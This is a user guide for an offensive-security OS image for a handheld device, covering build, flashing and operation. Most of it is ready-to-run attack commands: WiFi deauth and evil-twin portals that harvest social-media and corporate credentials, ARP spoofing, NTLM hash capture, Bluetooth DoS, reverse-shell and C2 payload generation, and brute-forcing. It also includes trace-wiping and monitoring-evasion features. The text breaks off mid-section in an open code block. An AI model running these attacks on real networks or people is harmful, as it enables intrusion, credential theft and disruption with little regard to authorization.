# ZERO-DAY OS — User Guide

**Complete guide to building, flashing, and operating ZERO-DAY OS on the M5Stack Cardputer Zero.**

*Last updated: 2026-04-26*

---

## Table of Contents

1. [System Requirements](#1-system-requirements)
2. [Building the Image](#2-building-the-image)
3. [Flashing to microSD](#3-flashing-to-microsd)
4. [First Boot](#4-first-boot)
5. [Post-Install Setup](#5-post-install-setup)
6. [The Keyboard](#6-the-keyboard)
7. [The Flipper TUI](#7-the-flipper-tui)
8. [WiFi Operations](#8-wifi-operations)
9. [Dual-WiFi with RTL8821CU Dongle](#9-dual-wifi-with-rtl8821cu-dongle)
10. [Network Reconnaissance](#10-network-reconnaissance)
11. [Bluetooth Operations](#11-bluetooth-operations)
12. [Infrared Hacking](#12-infrared-hacking)
13. [Camera & OCR](#13-camera--ocr)
14. [Reverse Shells & Payloads](#14-reverse-shells--payloads)
15. [Sub-GHz Radio (CC1101)](#15-sub-ghz-radio-cc1101)
16. [NFC / RFID (PN532)](#16-nfc--rfid-pn532)
17. [M5MonsterC5 — ESP32C5 WiFi Attack Board](#17-m5monsterc5--esp32c5-wifi-attack-board)
18. [JanOS Interactive Controller](#18-janos-interactive-controller)
19. [Ragnar Reconnaissance](#19-ragnar-reconnaissance)
20. [SDR & Hardware Tools](#20-sdr--hardware-tools)
21. [Meshtastic Mesh Networking](#21-meshtastic-mesh-networking)
22. [USB Gadget Mode](#22-usb-gadget-mode)
23. [Power Management](#23-power-management)
24. [Panic System](#24-panic-system)
25. [OpenCode (Pocket IDE)](#25-opencode-pocket-ide)
26. [Troubleshooting](#26-troubleshooting)
27. [File System Layout](#27-file-system-layout)
28. [Expansion Hardware Wiring](#28-expansion-hardware-wiring)

---

## 1. System Requirements

### Host (for building)
- x86_64 or aarch64 Linux machine
- Docker (without sudo)
- ~10GB free disk for build artifacts
- Internet connection (downloads ~800MB of packages)
- `qemu-user-static` and `binfmt_misc` for ARM emulation

### Target hardware
- **M5Stack Cardputer Zero** (BCM2837, 512MB LPDDR2, 1.9" LCD, 46-key keyboard)
- **32GB+ microSD card** (Class 10 / A1 or better)
- **Micro-USB cable** (for power)
- **Optional:** RTL8821CU USB WiFi dongle, CC1101 Sub-GHz module, PN532 NFC module, Meshtastic LoRa module

---

## 2. Building the Image

### Install prerequisites

**Arch Linux / CachyOS:**
```bash
sudo pacman -S docker qemu-user-static binfmt-support
sudo systemctl enable --now docker
sudo systemctl enable --now systemd-binfmt
# Add your user to docker group:
sudo usermod -aG docker $USER
# Log out and back in for group to take effect
```

**Ubuntu / Debian:**
```bash
sudo apt install docker.io qemu-user-static binfmt-support
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
# Log out and back in
```

### Clone and build

```bash
git clone <repo-url> cardzero
cd cardzero/pi-gen

# Start the build (~13 minutes on a modern machine)
./build-docker.sh
```

The build runs entirely inside a Docker container (`zeroday_pigen`). You'll see progress for each stage:

```
[18:30:00] Begin /pi-gen/stage0
[18:30:45] End /pi-gen/stage0
[18:30:45] Begin /pi-gen/stage1
...
[18:49:51] End /pi-gen/stage5
[18:49:51] Begin /pi-gen/export-image
[18:50:19] End /pi-gen/export-image
```

### Build output

The compressed image lands at:
```
pi-gen/deploy/2026-04-25-zeroday-os-.zip   (~129MB)
```

Inside is a raw 3.5GB SD card image with:
- **Partition 1:** 508MB FAT32 (boot partition, marked bootable)
- **Partition 2:** 3GB ext4 (root filesystem)

### Rebuilding

To rebuild from scratch:
```bash
docker rm -v zeroday_pigen 2>/dev/null
rm -rf pi-gen/work
./build-docker.sh
```

To continue a failed build (preserves container):
```bash
CONTINUE=1 ./build-docker.sh
```

### Build configuration

Edit `pi-gen/config` to change:
- `IMG_NAME` — Image name (default: `zeroday-os`)
- `FIRST_USER_PASS` — Default root password (default: `zeroday`)
- `DEPLOY_COMPRESSION` — Output format: `zip`, `gz`, `xz`, or `none`
- `PRESERVE_CONTAINER` — Keep Docker container after build for debugging (default: `1`)

---

## 3. Flashing to microSD

### With dd (Linux)

```bash
# Find your SD card device:
lsblk

# Flash (replace sdX with your device — WARNING: destroys existing data):
sudo dd if=pi-gen/work/zeroday-os/export-image/image-zeroday-os-.img \
     of=/dev/sdX bs=4M status=progress conv=fsync
```

### With BalenaEtcher (cross-platform)

1. Download [BalenaEtcher](https://etcher.balena.io/)
2. Select the `.img` file (extract from `.zip` first)
3. Select your microSD card
4. Click "Flash"

### Recommended card size

| Card Size | Usable After First Boot | Notes |
|---|---|---|
| 8GB | ~4GB free | Minimum — tight for wordlists + captures |
| 16GB | ~12GB free | Good for most ops |
| 32GB | ~28GB free | Recommended — room for everything |
| 64GB+ | 60GB+ free | Unlimited field ops |

---

## 4. First Boot

1. Insert the microSD into the Cardputer Zero
2. Connect power via micro-USB
3. The system boots (~7 seconds):
   - Kernel loads with device tree overlays
   - `zeroday-boot.service` runs (CPU governor, battery module)
   - Auto-login as `root` on tty1
   - Xorg + i3 start automatically
   - The Flipper TUI (`cyber_launcher`) appears on the 1.9" LCD

4. Log in with: **root** / **zeroday**

5. The **first-boot service** runs automatically:
   - Expands the root filesystem to fill the SD card
   - Generates SSH host keys
   - Configures systemd-resolved for DNS
   - Writes `/etc/zeroday-release` with build info
   - Disables itself (one-shot service)

6. **Change the password immediately:**
   ```bash
   passwd
   ```

---

## 5. Post-Install Setup

### Configure WiFi

```bash
cardputer-wifi-setup    # Interactive WiFi configurator
```

Or manually:
```bash
# Connect to a network:
wpa_supplicant -B -i wlan0 -c <(wpa_passphrase "SSID" "PASSWORD")
dhclient wlan0
```

### Enable SSH

SSH is enabled by default (openssh-server, port 22). Connect from another machine:
```bash
ssh root@zeroday.local
# or: ssh root@<ip-address>
```

> **Security warning:** Change the default password before connecting to any network.

### Set up the RTL8821CU dongle

```bash
dongle-setup install    # Build & install driver (DKMS, ~2 min)
dongle-setup status     # Verify wlan1 is present
```

### Connect expansion modules

```bash
# CC1101 Sub-GHz → 2.54mm 14-pin port (SPI)
sudo subghz-scan 433.92

# PN532 NFC → Grove port (I2C, switches 1+2 ON)
sudo nfc-read

# Meshtastic LoRa → Grove port (UART, switches 1+2 OFF)
mesh-chat install
```

---

## 6. The Keyboard

The Cardputer Zero has a 46-key matrix keyboard. The `Fn` key (bottom-left) acts as `Alt` (`Mod1`) which drives all i3 window manager shortcuts and quick-launch commands.

### Global shortcuts (work from anywhere)

| Shortcut | Action |
|---|---|
| `Fn + Tab` | Toggle the Flipper TUI |
| `Fn + P` | **PANIC** — kill all offensive processes, wipe traces |
| `Fn + Space` | **STEALTH** — kill backlight (device looks off) |
| `Fn + Return` | Open a terminal (st → tmux) |
| `Fn + Q` | Close current window |
| `Fn + O` | Open OpenCode editor |

### Quick-launch shortcuts

| Shortcut | Action |
|---|---|
| `Fn + N` | Nmap quick scan |
| `Fn + B` | Bluetooth scan |
| `Fn + S` | Start reverse shell listener |
| `Fn + W` | Toggle WiFi on/off |
| `Fn + C` | Camera snap |
| `Fn + I` | IR scan |
| `Fn + D` | Dongle status |
| `Fn + A` | OpenCode ask (AI prompt) |

### Terminal shortcuts (inside tmux)

| Key | Action |
|---|---|
| `Ctrl+B c` | Create new window |
| `Ctrl+B n` | Next window |
| `Ctrl+B %` | Split horizontally |
| `Ctrl+B "` | Split vertically |
| `Ctrl+B d` | Detach session |
| `Ctrl+B [` | Scroll mode (q to exit) |

---

## 7. The Flipper TUI

The `cyber_launcher` is a Pygame (SDL2) GUI application that provides a Flipper Zero-style interface on the 1.9" LCD. It has three levels of navigation:

**Level 1 — Category Grid (4×3):**
```
┌────────┬────────┬────────┬────────┐
│  WIFI  │M5MON │  NET   │   BT   │
├────────┼────────┼────────┼────────┤
│  IR   │  CAM   │ PAYLD  │ RADIO  │
├────────┼────────┼────────┼────────┤
│MEDIA  │ SHELL  │  SYS   │  OPEN  │
└────────┴────────┴────────┴────────┘
```

**Level 2 — Tool List:** Shows all tools in the selected category with descriptions.

**Level 3 — Action/Prompt:** Pre-configured commands with validated input fields.

**Inline modes** (no terminal needed):
- **Walkie Talkie** (RADIO): Push-to-talk via UDP broadcast
- **Media Player** (MEDIA): Danish web radio + local music player

| Key | Action |
|---|---|
| `↑ ↓ ← →` | Navigate |
| `Enter` | Drill into category or execute action |
| `Esc` | Go back one level |
| `q` | Quit to terminal |

**Launch:** `Fn + Tab` or type `cyber_launcher`

---

## 8. WiFi Operations

### Quick survey
```bash
sudo wifi-scan wlan0          # Built-in WiFi
sudo wifi-scan wlan1          # Dongle (if connected)
```

### Continuous WiFi survey logging
```bash
sudo wifi-survey-log wlan0              # Log all APs seen (indefinite)
sudo wifi-survey-log wlan0 300          # Log for 5 minutes
sudo wifi-survey-log wlan1 0            # Indefinite on dongle
# Results saved to: /opt/cardputer/loot/wifi/survey_*.log
```

### Randomize MAC address (stealth)
```bash
sudo mac-rotate wlan0 random    # Randomize wlan0 MAC
sudo mac-rotate wlan0 restore   # Restore original MAC
sudo mac-rotate wlan0 status    # Show current MAC + status
sudo mac-rotate wlan1 random    # Randomize dongle MAC
```

### Capture a WPA handshake
```bash
# Single radio (you lose internet while attacking):
sudo wifi-monitor-toggle      # Switch wlan0 to monitor mode
sudo wifi-handshake wlan0 <BSSID> <CHANNEL>
sudo wifi-monitor-toggle      # Switch back to managed

# Dual radio (recommended — stay online on wlan0):
dongle-setup monitor          # wlan1 → monitor mode
sudo wifi-handshake wlan1 <BSSID> <CHANNEL>
# wlan0 stays connected throughout
```

### PMKID attack (no client needed)
```bash
sudo wifi-pmkid wlan1 <BSSID> <CHANNEL>
```

### Deauth attack
```bash
sudo wifi-deauth wlan1 <BSSID> <CHANNEL>
```

### Crack captured handshake
```bash
sudo wifi-crack /opt/cardputer/handshakes/handshake_*.cap
```

### Evil twin + captive portal
```bash
# Harvest WiFi credentials:
sudo wifi-evil-twin wlan0 eth0 "FreeWiFi" wifi

# Harvest corporate credentials (fake VPN page):
sudo wifi-evil-twin wlan0 eth0 "CorpWiFi" corporate

# Harvest social media credentials:
sudo wifi-evil-twin wlan0 eth0 "HotelWiFi" social

# Custom portal (serve your own HTML):
sudo wifi-evil-twin wlan0 eth0 "TargetAP" custom
```

Credentials are logged to `/opt/cardputer/loot/captive/captive_creds_*.log`.

---

## 9. Dual-WiFi with RTL8821CU Dongle

The RTL8821CU USB dongle on the USB-A port gives you a second WiFi radio (`wlan1`). This enables simultaneous attack and C2:

```
wlan0 (built-in) → Managed mode → C2, SSH, data exfiltration, internet
wlan1 (dongle)   → Monitor mode → deauth, handshake capture, evil twin
```

### Setup
```bash
dongle-setup install    # Build & install driver (first time only, ~2 min)
dongle-setup status     # Verify: driver loaded, wlan1 present, MAC shown
```

### Operations
```bash
dongle-setup monitor    # wlan1 → monitor mode (for attacks)
dongle-setup managed    # wlan1 → managed mode (for scanning/connecting)
dongle-setup scan       # Quick WiFi scan via dongle
dongle-setup test       # Full diagnostic: USB, driver, interface
```

### Supported dongles

Any adapter with the **RTL8821CU** chipset:
- ASUS USB-AC51
- TP-Link Archer T2U Nano
- Netgear A6100
- Generic RTL8821CU adapters from AliExpress/Amazon

> The udev rule `70-persistent-net.rules` ensures the dongle always appears as `wlan1`.

---

## 10. Network Reconnaissance

### Discover all hosts on the network
```bash
sudo net-discover eth0              # Auto-scan local subnet
sudo net-discover eth0 192.168.1.0/24  # Specific subnet
```

### Port scan with profiles
```bash
net-quickscan 192.168.1.1 quick     # Fast: top 1000 ports
net-quickscan 192.168.1.1 web        # Web: 80, 443, 8080, 8443, etc.
net-quickscan 192.168.1.1 full       # Full: all 65535 ports
net-quickscan 192.168.1.1 stealth # Stealth: SYN scan, no ping
net-quickscan 192.168.1.1 vuln       # Vuln: nmap vuln scripts
```

### Vulnerability scan chain
```bash
sudo net-vulnscan 192.168.1.1
# Runs: nmap --script=vuln → nikto → whatweb
```

### IoT-focused scanning
```bash
iot-scan 192.168.1.0/24             # Quick IoT scan (common ports)
iot-scan 192.168.1.1 cameras       # RTSP, HTTP webcam, ONVIF discovery
iot-scan 192.168.1.1 bacnet        # BACnet building automation
iot-scan 192.168.1.1 modbus        # Modbus/TCP industrial scan
iot-scan 192.168.1.1 deep           # All ports + version detection
```

### Web content discovery
```bash
gobuster dir -u http://192.168.1.1 -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u http://192.168.1.1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Pivoting and tunnels
```bash
# SOCKS5 proxy via SSH (auto-reconnect):
tunnel-mgr socks 10.0.0.1 1080 root

# Local port forward (access internal service):
tunnel-mgr forward 8080 192.168.1.100:80 10.0.0.1

# Reverse port forward (expose local service remotely):
tunnel-mgr reverse 4444 4444 10.0.0.1

# List active tunnels:
tunnel-mgr list

# Kill all tunnels:
tunnel-mgr killall
```

### C2 (Command & Control)
```bash
# Start encrypted C2 listener:
quick-c2 listen 4444              # Encrypted (TLS, default)
quick-c2 listen 4444 no           # Plaintext (unencrypted)

# Generate payload one-liners:
quick-c2 payload bash 10.0.0.1 4444       # Bash reverse shell
quick-c2 payload python 10.0.0.1 4444     # Python reverse shell
quick-c2 payload socat 10.0.0.1 4444     # Socat encrypted shell
quick-c2 payload powershell 10.0.0.1 4444 # PowerShell reverse shell
quick-c2 payload netcat 10.0.0.1 4444    # Netcat shell
```

### DNS-over-HTTPS proxy
```bash
# Start DoH proxy (evades DNS monitoring):
sudo doh-proxy start cloudflare 5353     # Cloudflare, port 5353
sudo doh-proxy start google 5354          # Google, port 5354
sudo doh-proxy start quad9 5355          # Quad9, port 5355

# Use with dig:
dig @127.0.0.1 -p 5353 example.com

# Use with nmap:
nmap --dns-servers 127.0.0.1:5353 target

# Stop:
doh-proxy stop
```

### MITM attacks
```bash
# ARP spoofing (dsniff):
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Responder (LLMNR/NBT-NS poisoner):
sudo responder -I eth0
# Captures NTLM hashes, credentials on the wire
```

---

## 11. Bluetooth Operations

### Scan for devices
```bash
sudo bt-scan
# Discovers all BLE + Classic devices in range
# Output: MAC, name, type, signal strength
```

### Deep enumeration
```bash
sudo bt-deep AA:BB:CC:DD:EE:FF
# Shows: device name, class, SDP records, LMP features, pairing state
```

### Attack
```bash
sudo bt-attack blueborne <MAC>   # BlueBorne RCE (if vulnerable)
sudo bt-attack l2ping <MAC>      # L2CAP ping flood (DoS)
sudo bt-attack rfcomm <MAC>      # RFCOMM port scan
sudo bt-attack obex <MAC>        # OBEX push (send file)
```

### MITM (Bettercap)
```bash
sudo bettercap -I wlan0
# Interactive MITM framework — WiFi + BLE attacks
# Capabilities: ARP spoofing, DNS spoofing, SSL strip, packet injection
# Use on the same network as your target
```

### BLE GATT exploration
```bash
sudo ble-gatt AA:BB:CC:DD:EE:FF
# Enumerates: services, characteristics, descriptors, handles
```

---

## 12. Infrared Hacking

### Capture a signal
```bash
sudo ir-scan
# Point any remote at the IR transceiver
# Captures and decodes raw IR signals
# Saved to /opt/cardputer/loot/ir/
```

### Replay a captured signal
```bash
sudo ir-replay /opt/cardputer/loot/ir/signal_20260425_*.raw
# Replays the exact signal via IR transmitter
# Use case: turn on/off TVs, ACs, projectors
```

### Brute-force power codes
```sudo ir-brute tv power```
# Sends every known TV power code for common brands
# Use case: turn off every TV in a room
```

---

## 13. Camera & OCR

### Capture a still image
```bash
cam-snap                    # Saves to /opt/cardputer/loot/cam/
cam-snap /tmp/badge.jpg     # Custom output path
```

### Record video
```bash
cam-stream 10               # Record 10 seconds of H.264 video
```

### OCR (read text from camera)
```bash
cam-ocr                     # Capture + Tesseract OCR → stdout + text file
```

**Use cases:**
- Photograph a badge → OCR the name/ID
- Capture a screen → extract displayed text/data
- Read serial numbers, IP addresses, credentials on sticky notes

---

## 14. Reverse Shells & Payloads

### Encrypted C2 listener
```bash
# Start encrypted listener (default: port 4444):
quick-c2 listen                    # Encrypted with auto-generated TLS
quick-c2 listen 8443 no            # Plaintext (no encryption)

# Generate payload for target:
quick-c2 payload bash 10.0.0.1 4444       # Bash reverse shell
quick-c2 payload python 10.0.0.1 4444     # Python reverse shell
quick-c2 payload socat 10.0.0.1 4444     # Socat encrypted shell (use with TLS listener)
quick-c2 payload powershell 10.0.0.1 4444 # PowerShell reverse shell
quick-c2 payload netcat 10.0.0.1 4444    # Netcat shell
quick-c2 payload sh 10.0.0.1 4444        # Minimal sh shell
```

### Legacy shell tools
```bash
revshell-listen              # Default: port 4444
revshell-listen 8080         # Custom port
revshell-stabilize           # PTY/TTY upgrade cheatsheet
```

### Password cracking
```bash
# John the Ripper (on-device, works on 512MB RAM):
john --format=raw-md5 hashes.txt              # MD5 hashes
john --format=raw-sha256 hashes.txt            # SHA-256
john --format=nt hashes.txt                    # NTLM (Windows)
john --format=bcrypt hashes.txt                # bcrypt (slow but works)
john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hashes.txt

# Hydra (online credential brute-forcing):
hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt ssh://192.168.1.1
hydra -l root -P wordlist.txt ftp://192.168.1.1
hydra -L userlist.txt -P passlist.txt http-post-form://192.168.1.1/login.php
```

### Handshake conversion (for off-device cracking)
```bash
# Convert captured .cap files for hashcat (desktop GPU cracking):
cap2hccapx /opt/cardputer/handshakes/handshake.cap output.hccapx
# Then transfer .hccapx to your desktop GPU cracker
```

### Searchsploit — find known exploits
```bash
searchsploit apache 2.4           # Search by keyword
searchsploit --exclude-poc windows remote  # Filter by type
searchsploit -x 12345              # Examine a specific exploit
```

---

## 15. Sub-GHz Radio (CC1101)

Requires a CC1101 module connected to the 2.54mm 14-pin expansion port (SPI).

### Scan Sub-GHz frequencies
```bash
sudo subghz-scan 433.92       # 433MHz band (most common)
sudo subghz-scan 315          # 315MHz band (Japan/Asia)
sudo subghz-scan 868          # 868MHz band (Europe)
sudo subghz-scan 915          # 915MHz band (Americas)
```

### Record a signal
```bash
sudo subghz-record 433.92 10  # Record 10 seconds at 433.92MHz
# Saved to /opt/cardputer/loot/rf/
```

### Replay a recorded signal
```bash
sudo subghz-replay /opt/cardputer/loot/rf/signal_*.raw
# Confirms before transmitting
# Default: 3 repeats at original frequency
```

> **Legal notice:** Transmitting on Sub-GHz frequencies may require a license in your jurisdiction. Only transmit on frequencies you are legally authorized to use.

---

## 16. NFC / RFID (PN532)

Requires a PN532 module connected to the Grove HY2.0-4P port (I2C mode, switches 1+2 ON).

### Read an NFC tag
```bash
sudo nfc-read
# Detects: UID, tag type (MIFARE Classic, NTAG, Ultralight)
# Dumps: NDEF records, MIFARE sectors
# Saves to /opt/cardputer/loot/nfc/
```

### Clone a tag
```bash
sudo nfc-clone AA:BB:CC:DD:EE:FF     # Clone by UID
sudo nfc-clone /opt/cardputer/loot/nfc/dump_*.mfd  # Clone from dump file
```

### Emulate a tag
```bash
sudo nfc-emulate mifare    # Emulate a MIFARE Classic tag
sudo nfc-emulate ntag      # Emulate an NTAG tag
sudo nfc-emulate AA:BB:CC:DD:EE:FF  # Emulate a specific UID
```

---

## 17. M5MonsterC5 — ESP32C5 WiFi Attack Board

The M5MonsterC5 is an ESP32C5-based add-on board running JanOS/projectZero firmware that connects to the Cardputer Zero via USB-A or UART serial. It provides dedicated WiFi attack hardware — offloading monitor-mode attacks from the Cardputer's own radios so `wlan0` stays online for C2 throughout the engagement.

### Connecting the board

Plug the M5MonsterC5 into the USB-A port on the back of the Cardputer Zero. The `monsterctl` script auto-detects the serial connection by scanning `/dev/ttyUSB*`, `/dev/ttyACM*`, and `/dev/ttyAMA0` at 115200 baud.

Verify the connection:
```bash
monsterctl ping
# Expected response: pong
```

### Checking status

```bash
monsterctl status
# Shows: board firmware version, WiFi mode, connected clients, running attacks, GPS fix
```

### Scanning networks

```bash
monsterctl scan
# Lists all visible APs with: index, ESSID, BSSID, channel, encryption, signal strength
```

### Selecting targets

```bash
monsterctl select 1        # Select AP #1 from scan results
monsterctl select 1 3      # Select APs #1 and #3
```

### Attack commands

**Deauth attack:**
```bash
monsterctl scan
monsterctl select 2
monsterctl deauth
# Sends deauth frames to all clients of the selected AP
```

**Evil twin:**
```bash
monsterctl select 1
monsterctl evil_twin
# Clones selected AP, starts captive portal
```

**WPA3 SAE overflow:**
```bash
monsterctl select 4
monsterctl sae_overflow
# Floods WPA3 SAE handshake to trigger DoS
```

**Karma attack:**
```bash
monsterctl karma
# Responds to all probe requests, lures clients
```

**Handshake capture:**
```bash
monsterctl select 1
monsterctl handshake
# Captures WPA/WPA2 4-way handshake → saved on board SD card
```

**Sniffer mode:**
```bash
monsterctl sniffer
# Captures all WiFi traffic on current channel
```

**Blackout (mass deauth):**
```bash
monsterctl blackout
# Deauths all clients from all visible APs simultaneously
```

**SnifferDog (follow a client):**
```bash
monsterctl sniffer_dog
# Locks onto a specific client, follows channel hops
```

**Beacon spam:**
```bash
monsterctl beacon_spam
# Floods beacons with thousands of random SSIDs
```

**Rogue AP:**
```bash
monsterctl rogue_ap
# Starts a standalone rogue access point
```

**ARP poisoning:**
```bash
monsterctl arp_poison 192.168.1.1
# Poisons ARP cache for specified gateway
```

**Deauth detection:**
```bash
monsterctl deauth_detect
# Monitors for deauth frames in the area
```

**Wardriving:**
```bash
monsterctl wardrive
# Scans and logs all APs with GPS coordinates (if GPS module attached)
```

**Nmap scan via board:**
```bash
monsterctl nmap 192.168.1.0/24
# Port scan through the M5MonsterC5's WiFi connection
```

### Stopping attacks

```bash
monsterctl stop
# Stops all running attacks on the board
```

### Flashing firmware

```bash
monsterctl flash web          # Flash latest firmware from GitHub
monsterctl flash local        # Flash from local binary on SD card
monsterctl flash cardputer    # Flash from Cardputer SD card path
```

### Capturing looted credentials

```bash
monsterctl passwords         # Show captured credentials
monsterctl hosts             # Show discovered hosts
monsterctl probes            # Show captured probe requests
```

### Board WiFi connection

```bash
monsterctl wifi_connect "SSID" "password"   # Connect board to a network
monsterctl wifi_disconnect                   # Disconnect board from WiFi
```

### Board utilities

```bash
monsterctl gps              # Show GPS coordinates (if GPS module attached)
monsterctl channel_time 200 # Set dwell time per channel (200ms)
monsterctl list_sd          # List files on board's SD card
monsterctl list_html        # List captive portal HTML pages on board
```

### Links

- [M5MonsterC5-CardputerADV](https://github.com/C5Lab/M5MonsterC5-CardputerADV)
- [projectZero firmware](https://github.com/C5Lab/projectZero)

---

## 18. JanOS Interactive Controller

The JanOS-app is a Python TUI that provides an interactive, menu-driven front-end for the M5MonsterC5 board. Instead of memorizing `monsterctl` subcommands, you get a full-screen interactive interface for scanning, attacking, wardriving, and browsing captured data.

**Two ways to interact with the M5MonsterC5:**
- **`monsterctl`** — CLI/automation interface (one command per invocation, scriptable)
- **`install-janos`** — Interactive TUI (menu-driven, visual, browse results in real time)

### Installing JanOS-app

```bash
install-janos install
# Clones JanOS-app from GitHub to /opt/cardputer/janos-app/
# Installs pyserial dependency (lightweight, <5MB RAM)
```

Check installation status:

```bash
install-janos status
# Shows: installed/not-installed, version, serial port
```

### Launching the interactive TUI

```bash
install-janos run                      # Auto-detect serial port
install-janos run /dev/ttyUSB0         # Specify serial port
monsterctl janos                       # Alias — same as install-janos run
```

The TUI communicates with the M5MonsterC5 board over UART at 115200 baud, using the same command set as `monsterctl`.

### Interactive menu options

| Menu | Description |
|---|---|
| **Scan** | Scan for WiFi networks in range — shows ESSID, BSSID, channel, signal, encryption |
| **Sniffer** | Capture WiFi packets on current channel — live packet feed |
| **Attacks** | Menu of attack modes: Deauth, Blackout, SAE Overflow, Handshaker, Portal, Evil Twin, Beacon Spam, ARP, MITM |
| **Wardrive + GPS** | Wardrive scan with GPS coordinates — logs all APs with location data |
| **SD data browser** | Browse captured credentials, probe requests, and host data stored on the board's SD card |

### Attack sub-menus

Select a target AP from scan results, then choose an attack:

```bash
# From the TUI, the workflow is:
# 1. Select "Scan" → see APs, pick target(s)
# 2. Select "Attacks" → choose attack type
# 3. Monitor progress in real time
# 4. Select "SD data browser" → view captured credentials
```

### Updating JanOS-app

```bash
install-janos update
# Pulls latest changes from GitHub repository
```

### When to use each interface

| Task | Use `monsterctl` | Use `install-janos` (TUI) |
|---|---|---|
| Quick one-off command | ✓ | |
| Scripted / automated attacks | ✓ | |
| Interactive exploration | | ✓ |
| Browsing scan results visually | | ✓ |
| Monitoring attacks in real time | | ✓ |
| Wardriving with live GPS feed | | ✓ |
| Checking captured credentials | | ✓ |

### Links

- [JanOS-app repository](https://github.com/D3h420/JanOS-app)

---

## 19. Ragnar Reconnaissance

[Ragnar](https://github.com/PierreGode/Ragnar) is a comprehensive Python-based network reconnaissance platform with AI-powered analysis, Nuclei scanning, ZAP integration, traffic analysis, and a web dashboard. It requires 2–8GB RAM — far too heavy for the Cardputer Zero's 512MB.

ZERO-DAY OS provides three lightweight scripts inspired by Ragnar's core capabilities, each running in <50MB RAM using pure bash + curl + jq.

### Why not full Ragnar?

| Resource | Cardputer Zero | Ragnar minimum |
|---|---|---|
| RAM | 512MB (382MB free) | 2–8GB |
| Python deps | Limited | Full ML stack, Scikit-learn, etc. |
| Dashboard | No web browser | Flask/Dash web UI |
| Nuclei + ZAP | No Go runtime, too heavy | Required |

### ragnar-scan — Autonomous 3-phase network recon

```bash
# Quick scan (top ports, ~30 seconds):
ragnar-scan eth0 quick

# Full scan (all 65535 ports, ~5 minutes):
ragnar-scan eth0 full

# Vulnerability scan (nmap vuln scripts):
ragnar-scan eth0 vuln

# Stealth scan (SYN scan, no ping):
ragnar-scan eth0 stealth
```

The scan runs three phases automatically:
1. **Discover** — ARP scan + ping sweep to find live hosts
2. **Scan** — Nmap port scan with the selected profile
3. **Summarize** — Collate results into a human-readable report saved to `/opt/cardputer/loot/recon/`

### threat-intel — CVE and CISA vulnerability lookup

```bash
# Look up a specific CVE:
threat-intel cve CVE-2024-21762
# Shows: description, CVSS score, affected products, references

# Search CISA Known Exploited Vulnerabilities:
threat-intel search fortinet
# Shows: all CISA KEV entries matching "fortinet"

# Check known vulnerabilities for a service:
threat-intel check openssh 8.9
# Shows: known CVEs affecting OpenSSH 8.x

# Show recently added CISA KEV entries:
threat-intel recent
# Shows: vulnerabilities added to CISA KEV catalog in the last 30 days
```

### device-classify — Network device classification

```bash
# Classify devices from an nmap XML output:
device-classify /opt/cardputer/loot/recon/scan_*.xml
# Uses vendor OUI + service fingerprinting to classify:
#   - Network infrastructure (routers, switches, APs)
#   - IoT devices (cameras, smart TVs, printers)
#   - Workstations (Windows, Linux, macOS)
#   - Servers (web, mail, database)

# Pipe directly from ragnar-scan:
ragnar-scan eth0 quick
device-classify /opt/cardputer/loot/recon/scan_*.xml
```

### Combining ragnar-scan with threat-intel

```bash
# Full recon workflow:
ragnar-scan eth0 full                    # Phase 1-3: discover, scan, summarize
threat-intel check apache 2.4            # Check vulns for discovered services
threat-intel cve CVE-2024-XXXX           # Look up specific CVEs from the report
device-classify /opt/cardputer/loot/recon/scan_*.xml  # Classify discovered devices
```

### Running full Ragnar on a separate machine

For the complete Ragnar experience (AI analysis, Nuclei scanning, ZAP, traffic analysis, web dashboard), run Ragnar on a separate machine with 8GB+ RAM and use ZERO-DAY OS as your hands-on attack tool:

```bash
# On the powerful machine:
git clone https://github.com/PierreGode/Ragnar
cd Ragnar
pip install -r requirements.txt
python ragnar.py

# On Cardputer Zero:
ragnar-scan eth0 full    # Lightweight recon, feed results to Ragnar
```

---

## 20. SDR & Hardware Tools

Requires an RTL-SDR USB dongle connected to the USB-A port for SDR operations. GPIO probing works with built-in hardware.

### SDR frequency scan
```bash
sudo sdr-scan                    # Scan 433MHz band for 10 seconds (default)
sudo sdr-scan 315.0-316.0 5     # Scan 315MHz band for 5 seconds
sudo sdr-scan 868.0-869.0 30    # Scan 868MHz (EU) for 30 seconds
sudo sdr-scan 88.0-108.0 15     # Scan FM radio band
```

Output: CSV frequency sweep + signal peaks, saved to `/opt/cardputer/loot/sdr/`.

### Raw RF capture
```bash
sudo rf-capture                           # Capture 433.92MHz for 10s at 2.4Msps
sudo rf-capture 315.0 5                   # Capture 315MHz for 5s
sudo rf-capture 868.0 30 1200000          # Capture 868MHz for 30s at 1.2Msps
sudo rf-capture 1090.0 60                  # Capture ADS-B (aircraft) for 60s
```

Output: Raw IQ file + metadata, saved to `/opt/cardputer/loot/rf/`.

### GPIO/I2C/SPI/UART probe
```bash
sudo gpio-probe
# Enumerates all I2C devices, SPI devices, UART ports, and GPIO state
# Shows Grove + ExtPort pin mappings
```

**Supported SDR dongles:**
- RTL-SDR v3 / v4
- Nooelec NESDR Smart
- Any RTL2832U-based USB dongle

> **Note:** `hackrf` and `soapysdr-tools` are not included in the default image (too heavy for 512MB armhf). Install manually with `apt install hackrf soapysdr-tools` if needed.

---

## 21. Meshtastic Mesh Networking

Requires a Meshtastic-compatible LoRa module connected to the Grove port (UART mode, switches 1+2 OFF).

> **Note:** PN532 NFC and Meshtastic LoRa share the Grove port — they cannot be used simultaneously.

### Install and configure
```bash
mesh-chat install                  # Auto-detect module, install Python CLI
mesh-chat install --port /dev/ttyUSB0  # Specify serial port
```

### Full setup with mesh-setup
```bash
mesh-setup install                # Full install — CLI, dependencies, wiring guide
mesh-setup init                   # Initialize and configure a LoRa node
mesh-setup info                   # Show node info, battery, signal, GPS
```

`mesh-setup` provides a deeper setup experience than `mesh-chat install`, including serial port detection, region configuration, and wiring instructions.

### Send messages
```bash
mesh-chat send All "Hello team"     # Broadcast to all nodes
mesh-chat send 1 "Target found"     # Send to channel 1
mesh-chat send !abc123 "Ready"     # Send to specific node
```

### Listen and chat
```bash
mesh-chat listen                    # One-time message dump
mesh-chat listen 0                  # Continuous monitoring
mesh-chat chat 1                    # Interactive chat on channel 1
```

### Node management
```bash
mesh-chat nodes                     # List all discovered nodes
